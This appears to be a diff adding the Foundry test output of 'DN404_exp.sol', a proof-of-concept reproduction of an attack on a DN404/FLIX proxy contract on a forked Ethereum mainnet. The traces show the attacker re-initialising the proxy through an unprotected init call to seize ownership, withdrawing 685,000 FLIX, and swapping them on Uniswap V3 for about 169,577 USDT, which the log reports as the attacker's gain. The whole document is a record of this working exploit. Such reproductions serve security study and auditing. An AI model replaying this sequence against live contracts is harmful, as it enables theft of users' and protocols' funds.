@@ -1,0 +1,84 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/DN404_exp.sol:DN404
+[PASS] testExploit() (gas: 164162)
+Logs:
+   Attacker USDT Balance Before exploit: 0.000000
+   Attacker USDT Balance After exploit: 169577.736489
+
+Traces:
+  [7108] DN404::setUp()
+    ├─ [0] VM::label(Proxy: [0x2c7112245Fc4af701EBf90399264a7e89205Dad4], "Proxy")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], "WETH")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(FLIX: [0x83Cb9449b7077947a13Bf32025A8eAA3Fb1D8A5e], "FLIX")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(USDT: [0xdAC17F958D2ee523a2206206994597C13D831ec7], "USDT")
+    │   └─ ← [Return]
+    ├─ [0] VM::label(Uniswap V3 Pair: [0xa7434b755852F2555D6F96B9E28bAfE92F08Df97], "Uniswap V3 Pair")
+    │   └─ ← [Return]
+    ├─ [0] VM::createSelectFork("mainnet", 19196685 [1.919e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [188862] DN404::testExploit()
+    ├─ [5031] USDT::balanceOf(DN404: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_decimal_uint(key: " Attacker USDT Balance Before exploit", val: 0, decimals: 6)
+    ├─ [2886] FLIX::balanceOf(Proxy: [0x2c7112245Fc4af701EBf90399264a7e89205Dad4]) [staticcall]
+    │   └─ ← [Return] 685000000000000000000000 [6.85e23]
+    ├─ [28270] Proxy::init(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 1, 1000000000000000000 [1e18])
+    │   ├─ [21104] 0xe58aCB560FC33e283ab70c700A0F2eed0E333e0a::init(WETH: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 1, 1000000000000000000 [1e18]) [delegatecall]
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0x00000000000000000000000083cb9449b7077947a13bf32025a8eaa3fb1d8a5e → 0x000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2
+    │   │   │   @ 1: 0x0000000000000000000000005a5770b92bb237e4774f2b915367f7a3f903f2df → 0x0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496
+    │   │   │   @ 6: 10 → 1
+    │   │   │   @ 7: 604800 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [34317] Proxy::withdraw(FLIX: [0x83Cb9449b7077947a13Bf32025A8eAA3Fb1D8A5e], 685000000000000000000000 [6.85e23], DN404: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
+    │   ├─ [33651] 0xe58aCB560FC33e283ab70c700A0F2eed0E333e0a::withdraw(FLIX: [0x83Cb9449b7077947a13Bf32025A8eAA3Fb1D8A5e], 685000000000000000000000 [6.85e23], DN404: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   ├─ [886] FLIX::balanceOf(Proxy: [0x2c7112245Fc4af701EBf90399264a7e89205Dad4]) [staticcall]
+    │   │   │   └─ ← [Return] 685000000000000000000000 [6.85e23]
+    │   │   ├─ [28551] FLIX::transfer(DN404: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 685000000000000000000000 [6.85e23])
+    │   │   │   ├─ emit Transfer(from: Proxy: [0x2c7112245Fc4af701EBf90399264a7e89205Dad4], to: DN404: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 685000000000000000000000 [6.85e23])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xb97239ea537226cd78b2f80e41f4030a54feb1db79f49c3b22d049a961ce218e: 0x00000000000000000000000000000000000000000000910deca5fa74b2200000 → 0
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x00000000000000000000000000000000000000000000910deca5fa74b2200000
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   └─ ← [Return]
+    ├─ [95814] Uniswap V3 Pair::swap(DN404: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 685000000000000000000000 [6.85e23], 4295128740 [4.295e9], 0x)
+    │   ├─ [37601] USDT::transfer(DN404: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 169577736489 [1.695e11])
+    │   │   ├─ emit Transfer(from: Uniswap V3 Pair: [0xa7434b755852F2555D6F96B9E28bAfE92F08Df97], to: DN404: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 169577736489 [1.695e11])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x6e10ff27cae71a13525bd61167857e5c982b4674c8e654900e4e9d5035811f78: 0 → 0x000000000000000000000000000000000000000000000000000000277b9ee929
+    │   │   │   @ 0x368b6be491dac7832569c6f5a9d8fb1e5ac59854c0d3b9d9929c9b6c63592fa2: 0x0000000000000000000000000000000000000000000000000000003be09289f4 → 0x0000000000000000000000000000000000000000000000000000001464f3a0cb
+    │   │   └─ ← [Stop]
+    │   ├─ [2886] FLIX::balanceOf(Uniswap V3 Pair: [0xa7434b755852F2555D6F96B9E28bAfE92F08Df97]) [staticcall]
+    │   │   └─ ← [Return] 351464217487015431503144 [3.514e23]
+    │   ├─ [8782] DN404::uniswapV3SwapCallback(685000000000000000000000 [6.85e23], -169577736489 [-1.695e11], 0x)
+    │   │   ├─ [6651] FLIX::transfer(Uniswap V3 Pair: [0xa7434b755852F2555D6F96B9E28bAfE92F08Df97], 685000000000000000000000 [6.85e23])
+    │   │   │   ├─ emit Transfer(from: DN404: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: Uniswap V3 Pair: [0xa7434b755852F2555D6F96B9E28bAfE92F08Df97], value: 685000000000000000000000 [6.85e23])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0x00000000000000000000000000000000000000000000910deca5fa74b2200000 → 0
+    │   │   │   │   @ 0x4197957f702ad1fdade5e939ab76f66b962d58099c9238a31032e857ac8ae1cb: 0x000000000000000000000000000000000000000000004a6ce9d513356cadfd28 → 0x00000000000000000000000000000000000000000000db7ad67b0daa1ecdfd28
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [886] FLIX::balanceOf(Uniswap V3 Pair: [0xa7434b755852F2555D6F96B9E28bAfE92F08Df97]) [staticcall]
+    │   │   └─ ← [Return] 1036464217487015431503144 [1.036e24]
+    │   ├─ emit Swap(sender: DN404: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], recipient: DN404: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0: 685000000000000000000000 [6.85e23], amount1: -169577736489 [-1.695e11], sqrtPriceX96: 22994877587576560656852 [2.299e22], liquidity: 299985397678797547 [2.999e17], tick: -301067 [-3.01e5])
+    │   ├─  storage changes:
+    │   │   @ 0: 0x000100000100010000fbbc6a000000000000000000000e5a714306dbfba96f13 → 0x000100000100010000fb67f50000000000000000000004de8e0825d16439a1d4
+    │   │   @ 8: 0x0100000000000000000696f9106bfb5d8eab2a482fffff8d0366dcd865c6ecbb → 0x01000000000000000006a9d24687bda3672eed94daffff8bb4cf7a8865c73b33
+    │   │   @ 1: 0x000000000000000000000000000030067f76bfe6e6720fb722fe7504550d9b48 → 0x00000000000000000000000000004ac8d4d2cdf8e64956765fb51a5c92e8c615
+    │   └─ ← [Return] 685000000000000000000000 [6.85e23], -169577736489 [-1.695e11]
+    ├─ [1031] USDT::balanceOf(DN404: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 169577736489 [1.695e11]
+    ├─ emit log_named_decimal_uint(key: " Attacker USDT Balance After exploit", val: 169577736489 [1.695e11], decimals: 6)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 7.56s (6.11s CPU time)
+
+Ran 1 test suite in 9.31s (7.56s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
